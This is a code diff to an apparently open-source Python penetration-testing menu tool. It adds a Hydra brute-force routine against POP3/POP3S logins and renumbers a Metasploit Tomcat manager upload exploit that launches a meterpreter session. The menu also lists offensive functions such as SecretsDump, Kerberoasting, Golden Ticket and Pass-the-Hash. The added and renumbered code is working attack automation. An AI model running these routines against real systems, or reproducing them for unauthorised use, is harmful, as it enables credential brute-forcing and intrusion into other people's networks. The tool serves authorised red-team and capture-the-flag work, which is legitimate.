@@ -286,16 +286,16 @@ def display():
    print('\u2560' + ('\u2550')*14 + '\u2567'+ ('\u2550')*42 + '\u2569' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u2569' + ('\u2550')*58 + '\u2563')
 
 def options():
-   print('\u2551' + "(0) REMOTE IP Scanner (10) Re/Set SHARENAME  (20) GetArch (30) Enum4Linux     (40) KerbInfo 88    (50) Golden PAC  (60) GenSSHKey ID (70) Hydra Tom (80) SSH ID 22 " + '\u2551')
-   print('\u2551' + "(1) Re/Set DNS SERVER (11) Re/Set SERVERTIME (21) NetView (31) WinDap Search  (41) KerbUserFilter (51) Domain Dump (61) GenList USER (71) MSFTomcat (81) Telnet 23 " + '\u2551')
-   print('\u2551' + "(2) Re/Set REMOTE IP  (12) Re/Set DIRECTORY  (22) Service (32) Lookup Sids    (42) KerbBruteForce (52) BloodHound  (62) GenList PASS (72)           (82) NetCat 80 " + '\u2551')
-   print('\u2551' + "(3) Re/Set LIVE PORTS (13) Check Connection  (23) AtExec  (33) SamDump Users  (43) KerbRoasting   (53) ACLPwn      (63) Editor USER  (73)           (83) SQSH  1433" + '\u2551')
-   print('\u2551' + "(4) Re/Set WEBADDRESS (14) DNSDump DNSSERVER (24) DcomExe (34) REGistryValues (44) KerbASREPRoast (54) SecretsDump (64) Editor PASS  (74)           (84) MSSQL 1433" + '\u2551')
-   print('\u2551' + "(5) Re/Set USERNAME   (15) DNSReco DNSSERVER (25) PsExec  (35) RpcDump        (45) PASSWORD2HASH  (55) CrackMapExe (65) Editor HOST  (75) MailForce (85) MySQL 3306" + '\u2551')
-   print('\u2551' + "(6) Re/Set PASSWORD   (16) NMap LIVE PORTS   (26) SmbExec (36) RpcClient 135  (46) Pass the HASH  (56) PSExec HASH (66) Editor DNS   (76) Nikto     (86) RDesk 3389" + '\u2551')
-   print('\u2551' + "(7) Re/Set NTLM HASH  (17) NMap PORTServices (27) WmiExec (37) SmbClient 139  (47) PasstheTicket  (57) SmbExecHASH (67) Hydra FTP    (77) GoBuster  (87) XRDP  3389" + '\u2551')
-   print('\u2551' + "(8) Re/Set DOMAINNAME (18) NMap SubDOMAINS   (28) IfMap   (38) SmbMap SHARE   (48) Silver Ticket  (58) WmiExecHASH (68) Hydra SSH    (78) FTP 21    (88) WinRm 5985" + '\u2551')
-   print('\u2551' + "(9) Re/Set DOMAINSID  (19) NMAP SERVERTIME   (29) OpDump  (39) SmbMount SHARE (49) Golden Ticket  (59) GPP Decrypt (69) Hydra SMB    (79) SSH 22    (89) Save/Exit " + '\u2551')
+   print('\u2551' + "(0) REMOTE IP Scanner (10) Re/Set SHARENAME  (20) GetArch (30) Enum4Linux     (40) KerbInfo 88    (50) Golden PAC  (60) GenSSHKeyID (70) Hydra POP3 (80) SSH ID 22 " + '\u2551')
+   print('\u2551' + "(1) Re/Set DNS SERVER (11) Re/Set SERVERTIME (21) NetView (31) WinDap Search  (41) KerbUserFilter (51) Domain Dump (61) GenListUSER (71) Hydra TOM  (81) Telnet 23 " + '\u2551')
+   print('\u2551' + "(2) Re/Set REMOTE IP  (12) Re/Set DIRECTORY  (22) Service (32) Lookup Sids    (42) KerbBruteForce (52) BloodHound  (62) GenListPASS (72) MSF Tomcat (82) NetCat 80 " + '\u2551')
+   print('\u2551' + "(3) Re/Set LIVE PORTS (13) Check Connection  (23) AtExec  (33) SamDump Users  (43) KerbRoasting   (53) ACLPwn      (63) Editor USER (73) RESERVED   (83) SQSH  1433" + '\u2551')
+   print('\u2551' + "(4) Re/Set WEBADDRESS (14) DNSDump DNSSERVER (24) DcomExe (34) REGistryValues (44) KerbASREPRoast (54) SecretsDump (64) Editor PASS (74) RESERVED   (84) MSSQL 1433" + '\u2551')
+   print('\u2551' + "(5) Re/Set USERNAME   (15) DNSReco DNSSERVER (25) PsExec  (35) RpcDump        (45) PASSWORD2HASH  (55) CrackMapExe (65) Editor HOST (75) MailForce  (85) MySQL 3306" + '\u2551')
+   print('\u2551' + "(6) Re/Set PASSWORD   (16) NMap LIVE PORTS   (26) SmbExec (36) RpcClient 135  (46) Pass the HASH  (56) PSExec HASH (66) Editor DNS  (76) Nikto      (86) RDesk 3389" + '\u2551')
+   print('\u2551' + "(7) Re/Set NTLM HASH  (17) NMap PORTServices (27) WmiExec (37) SmbClient 139  (47) PasstheTicket  (57) SmbExecHASH (67) Hydra FTP   (77) GoBuster   (87) XRDP  3389" + '\u2551')
+   print('\u2551' + "(8) Re/Set DOMAINNAME (18) NMap SubDOMAINS   (28) IfMap   (38) SmbMap SHARE   (48) Silver Ticket  (58) WmiExecHASH (68) Hydra SSH   (78) FTP 21     (88) WinRm 5985" + '\u2551')
+   print('\u2551' + "(9) Re/Set DOMAINSID  (19) NMAP SERVERTIME   (29) OpDump  (39) SmbMount SHARE (49) Golden Ticket  (59) GPP Decrypt (69) Hydra SMB   (79) SSH 22     (89) Save/Exit " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
 
 # -------------------------------------------------------------------------------------
@@ -2419,6 +2419,54 @@ while True:
             if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
             
       prompt() 
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : SNEAKY
+# Details : Menu option selected - HYDRA POP3 BRUTEFORCE
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='70':
+      CheckParams = 0   
+
+      if TIP[:5] == "EMPTY":
+         print("[-] Remote IP address has not been specified...")
+         CheckParams = 1
+         
+      if CheckParams != 1:
+         if os.path.getsize("usernames.txt") == 0:
+            print("[-] Username file is empty...")
+            if USER[:1] != "'":
+               print("[*] Adding user '" + USR.rstrip(" ") + "'...")
+               command("echo " + USR.rstrip(" ") + " >> usernames.txt")
+            else:
+               print("[*] Adding user 'administrator'...")
+               command("echo 'administrator' >> usernames.txt")
+         
+         if os.path.getsize("passwords.txt") == 0:             
+            print("\n[-] Password file is empty...")
+            if PASS[:1] != "'":
+               print("[*] Adding password '" + PAS.rstrip(" ") + "'...")
+               command("echo '" + PAS.rstrip(" ") + "' >> passwords.txt")
+            else:
+               print("[*] Adding password 'password'...")
+               command("echo password >> passwords.txt")
+         
+         if "110" in PORT:
+            command("hydra -P passwords.txt -L usernames.txt " + TIP.rstrip(" ") + " POP3")
+         else:
+            if "995" in PORT:
+               command("hydra -P passwords.txt -L usernames.txt " + TIP.rstrip(" ") + " POP3s")
+            else:
+               print("[-] Pop3 ports have not been found in LIVE PORTS...")
+               
+         for x in range (0,MAXX):
+            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
+            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
+            
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2428,7 +2476,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='70':
+   if selection =='71':
       if WEB[:5] == "EMPTY":
          print("[-] Target web address not specified...")
       else:
@@ -2469,7 +2517,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='71':
+   if selection =='72':
       command("touch meterpreter.rc")
       command("echo 'use exploit/multi/http/tomcat_mgr_upload' >> meterpreter.rc")
       command("echo 'set RHOSTS " + TIP.rstrip(" ") + "' >> meterpreter.rc")
@@ -2490,18 +2538,7 @@ while True:
       command("echo 'run' >> meterpreter.rc")
       command("msfconsole -r meterpreter.rc")
       prompt() 
-      os.remove("meterpreter.rc")      
-            
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : SNEAKY
-# Details : Menu option selected - Exit(1)
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='72':
-      exit(1)          
+      os.remove("meterpreter.rc")  
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2513,7 +2550,7 @@ while True:
 
    if selection =='73':
       exit(1)
-
+      
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
@@ -2523,7 +2560,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='74':
-      exit(1)
+      exit(1)    
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
